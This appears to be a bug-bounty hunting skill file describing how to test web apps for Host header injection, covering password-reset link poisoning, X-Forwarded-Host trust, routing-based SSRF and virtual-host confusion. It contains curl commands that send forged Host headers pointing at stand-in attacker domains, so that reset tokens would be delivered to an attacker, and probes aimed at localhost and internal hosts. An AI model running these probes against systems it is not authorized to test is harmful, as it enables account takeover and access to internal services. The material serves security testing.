---
name: host-header
description: >
  Hunt for Host header injection/trust issues: password-reset link
  poisoning via a spoofed Host, routing-based SSRF through back-end virtual
  host confusion, and web-cache poisoning rooted in an unkeyed Host/
  X-Forwarded-Host. Use when the app constructs absolute URLs (reset links,
  canonical tags, redirects) from the incoming Host header. Keywords: Host
  header, X-Forwarded-Host, password reset poisoning, virtual host
  routing, SSRF via Host.
  Do NOT use for cache poisoning mechanics unrelated to Host — use
  cache-poisoning. Do NOT use for the password-reset token/flow logic
  itself beyond the Host vector — use password-reset for the rest.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-290, CWE-918]
  mitre_attack: [T1557, T1190]
  tools: [burpsuite, curl]
depends_on: [active-recon, web-crawling]
feeds_into: [chain-analysis]
chains_with: [password-reset, cache-poisoning, oauth]
---

## Signals

- Password reset / email verification links containing an absolute URL (`https://<domain>/reset?token=...`).
- `X-Forwarded-Host`, `X-Forwarded-Server`, `X-Host`, `Forwarded` headers accepted anywhere in the stack (CDN/LB passes them through to origin).
- Multiple virtual hosts/apps served from the same IP/load balancer (shared infrastructure, name-based routing).
- Absolute URLs in HTML (`<link rel="canonical">`, Open Graph tags, JS config blobs) that mirror the request's `Host`.

## Prerequisites

- An account you can trigger a password reset / verification email for, and visibility into the resulting email content (test inbox you control).
- Ability to send the raw `Host` header value independent of DNS (via `curl --resolve` or editing `/etc/hosts`-equivalent, or Burp's "Update Host header to match target" disabled).

## Methodology

1. **Confirm the app trusts the raw Host header for anything security-relevant.** Send a request with an arbitrary Host and see if it's reflected anywhere in the response body or affects routing:
   ```bash
   curl -s -i https://target.com/ -H "Host: evil.com"
   curl -s -i https://target.com/ --resolve target.com:443:<target_ip> -H "Host: evil.com" -k
   ```
   Grep the body for the injected value:
   ```bash
   curl -s https://target.com/ -H "Host: evil.com" | grep -i evil.com
   ```

2. **X-Forwarded-Host trust test**, since many apps sit behind a CDN/LB that sets `Host` correctly but trust a forwarded header for building "the real public URL" (common with Laravel, Django `USE_X_FORWARDED_HOST`, Node behind nginx):
   ```bash
   curl -s -i https://target.com/ -H "X-Forwarded-Host: evil.com" | grep -i evil.com
   curl -s -i https://target.com/ -H "X-Forwarded-Host: evil.com" -H "X-Forwarded-Proto: https" | grep -i evil.com
   curl -s -i https://target.com/ -H "Host: target.com" -H "X-Host: evil.com" | grep -i evil.com
   curl -s -i https://target.com/ -H "Forwarded: host=evil.com" | grep -i evil.com
   ```

3. **Password reset link poisoning — the main payoff.** Trigger a real reset request while supplying a malicious Host/X-Forwarded-Host, then inspect the actual email delivered:
   ```bash
   curl -s -i -X POST https://target.com/forgot-password \
     -H "Host: attacker-collab.net" \
     -d "email=victim-test-account@yourdomain.com"
   # also try the forwarded-header variant if plain Host didn't work
   curl -s -i -X POST https://target.com/forgot-password \
     -H "X-Forwarded-Host: attacker-collab.net" \
     -d "email=victim-test-account@yourdomain.com"
   ```
   Check the received email: if the reset link reads `https://attacker-collab.net/reset?token=<REAL_TOKEN>`, the token has just been exfiltrated to an attacker-controlled domain the moment the victim clicks it (or even via automatic link-preview crawlers in some mail clients, without any click).

4. **Routing-based SSRF via Host confusion.** On infrastructure using the Host header for internal routing decisions (reverse proxies routing by vhost, or apps that do `fetch(internal_service + Host)`-style construction), test whether a crafted Host reaches an internal-only service:
   ```bash
   curl -s -i https://target.com/ -H "Host: localhost"
   curl -s -i https://target.com/ -H "Host: 127.0.0.1"
   curl -s -i https://target.com/ -H "Host: internal-admin.target.internal"
   curl -s -i https://target.com/ -H "Host: target.com:1337"
   ```
   Look for different response content/timing/status that indicates the request landed on a different backend (an internal admin panel, a different app on the shared host).

5. **Absolute-URL reflection in rendered HTML** (less severe but chainable with cache poisoning): check canonical tags, Open Graph, and inline JS config:
   ```bash
   curl -s https://target.com/ -H "X-Forwarded-Host: evil.com" | grep -i -E 'canonical|og:url|evil.com'
   ```

6. **Default/first vhost confusion.** Some servers route unmatched Host values to the *first* configured virtual host rather than rejecting them — test sending no recognizable Host at all, or an IP, to see what app answers:
   ```bash
   curl -s -i -X GET "https://<target_ip>/" -H "Host: " 
   curl -s -i -X GET "https://<target_ip>/" --http1.1
   ```

## Tooling

- `curl --resolve host:port:ip` to control DNS resolution independent of the Host header value sent.
- Burp Suite with "Update Host header to match target" **disabled** in Repeater, to send arbitrary Host values to a fixed IP.
- A disposable test mailbox + Burp Collaborator/webhook.site as the "attacker" domain to receive poisoned links.

## Root Causes

- Application builds absolute URLs (for emails, redirects, canonical links) from the incoming `Host`/`X-Forwarded-Host` header instead of a server-side configured base URL/allow-list.
- Reverse proxy forwards client-supplied `X-Forwarded-Host` to the origin without the origin validating it against the expected public hostname.
- Shared hosting/load balancer routes by Host header without a strict allow-list, falling back to a default vhost that leaks internal services.

## Validation Gate (minimum proof)

- The actual delivered password-reset email (screenshot or raw source) showing the poisoned domain in the link, with the real, usable reset token embedded — the strongest proof, since it demonstrates full token exfiltration capability.
- For SSRF-via-routing: response content/headers proving a *different* backend answered (distinct error page, internal-only banner, different `Server` header) — not just a timing difference, which is Inferred at best.
- Always capture the exact header combination that worked; many apps only trust one specific header name (`X-Forwarded-Host` but not `X-Host`, etc.).

## Gotchas

- **Minimum proof:** the injected Host merely appearing in an error page's debug output is weak — the real-world proof is the poisoned value reaching an email, a redirect `Location`, or a different backend's response.
- **Common N/A:** app uses a hardcoded `APP_URL`/`SITE_URL` config value server-side for all link generation, ignoring the Host header entirely — verify via the reset-link test; if the link always shows the real domain regardless of what Host you send, close as N/A.
- **Overclaim trap:** Host header reflected in a response body on a page with no security consequence (not used in links, not used for routing) is informational, not a password-reset-poisoning finding — don't conflate reflection with exploitability.
- Load balancers/CDNs sometimes strip or overwrite `X-Forwarded-Host` before the origin sees it — a negative result at the edge doesn't confirm the origin app is safe if you can reach it directly (check for an exposed origin IP, in scope).
- This overlaps with password-reset — do the Host-header-specific vector here, defer token entropy/predictability/rate-limit analysis of the reset flow itself to that skill.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Password-reset poisoning** — Can a forged Host header poison a password-reset email link to redirect victims to an attacker domain?
2. **Cache poisoning chain** — Does the forged Host header get cached and served to other users (chain with cache-poisoning)?
3. **SSRF via internal routing** — Does the app use the Host header to construct internal requests, enabling SSRF?
4. **Virtual-host confusion** — Can the Host header route the request to an unintended internal vhost/backend?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Poisoned reset link + victim interaction (click, or automated link-preview fetch by mail security scanners) → full account takeover; chain fully into password-reset for the end-to-end writeup.
- Unkeyed Host/X-Forwarded-Host reflected into a cached response → mass poisoning, chain with cache-poisoning.
- Host-header-driven redirect target → feeds oauth if it affects an `/authorize` or callback flow.
- Routing-based SSRF reaching an internal admin service → chain into broken-access-control for whatever that internal service exposes.
